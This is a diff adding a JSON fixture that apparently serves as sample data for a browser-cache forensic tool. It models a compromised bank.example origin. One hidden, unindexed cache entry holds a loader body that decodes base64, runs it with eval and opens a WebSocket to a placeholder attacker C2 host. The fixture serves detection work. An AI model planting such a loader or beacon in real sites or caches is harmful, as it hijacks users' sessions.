@@ -1,0 +1,33 @@
+{
+  "profile": "SAMPLE-compromised",
+  "extracted_at": 1762700000.0,
+  "origins": [
+    {
+      "origin": "https://bank.example",
+      "origin_hash": "aaaa1111",
+      "caches": [
+        {
+          "name": "app-shell-v7", "guid": "g-shell", "in_index": true, "mtime": 1762600000.0,
+          "entries": [
+            {"request_url": "https://bank.example/main.js", "response_mime": "application/javascript",
+             "response_status": 200, "size": 51200, "body_sha256": "legit1", "body_entropy": 4.4,
+             "body_preview": "const APP='bank';export function boot(){}", "mtime": 1762600000.0},
+            {"request_url": "https://bank.example/styles.css", "response_mime": "text/css",
+             "response_status": 200, "size": 8000, "body_sha256": "legit2", "body_entropy": 4.1,
+             "body_preview": "body{margin:0}", "mtime": 1762600000.0}
+          ]
+        },
+        {
+          "name": "sync-tmp", "guid": "g-evil", "in_index": false, "mtime": 1762699900.0,
+          "entries": [
+            {"request_url": "https://cdn.evil-attacker.tld/loader.js",
+             "response_mime": "application/javascript", "response_status": 200, "size": 6144,
+             "body_sha256": "mal1", "body_entropy": 5.9,
+             "body_preview": "var p=atob('bWFsaWNpb3VzIGJhc2U2NCBwYXlsb2FkIHZlcnkgbG9uZyBzdHJpbmcgQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==');eval(p);new WebSocket('wss://cdn.evil-attacker.tld/c2');",
+             "mtime": 1762699900.0}
+          ]
+        }
+      ]
+    }
+  ]
+}
